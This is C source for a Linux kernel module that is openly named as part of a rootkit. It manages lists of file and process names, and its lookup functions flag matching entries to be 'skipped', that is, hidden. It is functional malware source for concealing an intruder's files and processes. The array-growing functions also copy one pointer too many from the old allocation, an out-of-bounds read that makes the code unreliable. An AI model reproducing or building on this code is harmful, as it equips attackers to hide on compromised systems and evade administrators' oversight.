#include <linux/gfp.h>
#include <linux/slab.h>
#include <linux/string.h>
#include "rootkit_strings.h"

// Rootkit string structure
struct rootkit_strs {
   char **array;
   int size;
};

// Global variable to hold rootkit string structures
struct rootkit_strs rootkit_fs_strings;
struct rootkit_strs rootkit_process_strings;


int in_fs_strings(char* input_str) {
    int i, rfs_size = 0;

    rfs_size = get_rootkit_fs_strings_size();

    for (i=0; i < rfs_size; i++) {
            /* Skip over hidden files. */
            if (strncmp(input_str, rootkit_fs_strings.array[i], strlen(rootkit_fs_strings.array[i])) == 0) {
               printk(KERN_INFO "Skipping: %s\n", rootkit_fs_strings.array[i]);
               return 1;
            } 
                
        }
    return 0;
}

int in_process_strings(char* input_str) {
    int i, rfs_size = 0;

    rfs_size = get_rootkit_process_strings_size();

    for (i=0; i < rfs_size; i++) {
            /* Skip over hidden files. */
            if (strncmp(input_str, rootkit_process_strings.array[i], strlen(rootkit_process_strings.array[i])) == 0) {
               printk(KERN_INFO "Skipping: %s\n", rootkit_process_strings.array[i]);
               return 1;
            } 
                
        }
    return 0;
}


char** get_rootkit_fs_strings(void) {
    return rootkit_fs_strings.array;
}

int get_rootkit_fs_strings_size(void) {
    return rootkit_fs_strings.size;
}

char** get_rootkit_process_strings(void) {
    return rootkit_process_strings.array;
}

int get_rootkit_process_strings_size(void) {
    return rootkit_process_strings.size;
}

int add_rootkit_process_string(char* add_str){
    char **new_array_ptr;
    char *new_str_ptr;
    int new_array_size = rootkit_process_strings.size + 1;
    int array_insert_index = rootkit_process_strings.size;
    int add_str_size = strlen(add_str)+1;

    // Special case for first insert
    if (rootkit_process_strings.size == 0) {
       new_array_ptr = (char **)kmalloc(new_array_size * sizeof(char*), GFP_KERNEL);

        if (!new_array_ptr) {
            #ifdef DEBUG
            printk(KERN_INFO "kmalloc failed\n");
            #endif
            goto exit;
        }

       rootkit_process_strings.array = new_array_ptr;
    } 
    else 
    {
        new_array_ptr = (char **)kmalloc(new_array_size * sizeof(char*), GFP_KERNEL);
        if (!new_array_ptr) {
            #ifdef DEBUG
            printk(KERN_INFO "kmalloc failed\n");
            #endif
            goto exit;
        }
        memcpy(new_array_ptr, rootkit_process_strings.array, new_array_size * sizeof(char*));
        kfree(rootkit_process_strings.array);
        rootkit_process_strings.array = new_array_ptr;
    }
    new_str_ptr = kcalloc(add_str_size, sizeof(char), GFP_KERNEL);
    if (!new_str_ptr) {
            #ifdef DEBUG
            printk(KERN_INFO "kcalloc failed\n");
            #endif
            goto exit;
    }
    rootkit_process_strings.array[array_insert_index] = new_str_ptr;
    strncpy(rootkit_process_strings.array[array_insert_index], add_str, add_str_size); 

    printk(KERN_INFO "Adding rootkit process string: %s\n", rootkit_process_strings.array[array_insert_index]); 
    rootkit_process_strings.size += 1;

    exit:
    return 0;
}

int add_rootkit_fs_string(char* add_str){
    char **new_array_ptr;
    char *new_str_ptr;
    int new_array_size = rootkit_fs_strings.size + 1;
    int array_insert_index = rootkit_fs_strings.size;
    int add_str_size = strlen(add_str)+1;

    // Special case for first insert
    if (rootkit_fs_strings.size == 0) {
       new_array_ptr = (char **)kmalloc(new_array_size * sizeof(char*), GFP_KERNEL);

        if (!new_array_ptr) {
            #ifdef DEBUG
            printk(KERN_INFO "kmalloc failed\n");
            #endif
            goto exit;
        }

       rootkit_fs_strings.array = new_array_ptr;
    } 
    else 
    {
        new_array_ptr = (char **)kmalloc(new_array_size * sizeof(char*), GFP_KERNEL);
        if (!new_array_ptr) {
            #ifdef DEBUG
            printk(KERN_INFO "kmalloc failed\n");
            #endif
            goto exit;
        }
        memcpy(new_array_ptr, rootkit_fs_strings.array, new_array_size * sizeof(char*));
        kfree(rootkit_fs_strings.array);
        rootkit_fs_strings.array = new_array_ptr;
    }
    new_str_ptr = kcalloc(add_str_size, sizeof(char), GFP_KERNEL);
    if (!new_str_ptr) {
            #ifdef DEBUG
            printk(KERN_INFO "kcalloc failed\n");
            #endif
            goto exit;
    }
    rootkit_fs_strings.array[array_insert_index] = new_str_ptr;
    strncpy(rootkit_fs_strings.array[array_insert_index], add_str, add_str_size);  

    printk(KERN_INFO "Adding rootkit fs string: %s\n", rootkit_fs_strings.array[array_insert_index]); 
    rootkit_fs_strings.size += 1;

    exit:
    return 0;
}

void int_rootkit_strings(void){
    rootkit_fs_strings.array = NULL;
    rootkit_fs_strings.size = 0;

    rootkit_process_strings.array = NULL;
    rootkit_process_strings.size = 0;
}


void cleanup_rootkit_strings(void){
    int i;

    for(i=0; i<rootkit_fs_strings.size; i++){
        kfree(rootkit_fs_strings.array[i]);
    }
    kfree(rootkit_fs_strings.array);

    for(i=0; i<rootkit_process_strings.size; i++){
        kfree(rootkit_process_strings.array[i]);
    }
    kfree(rootkit_process_strings.array);

}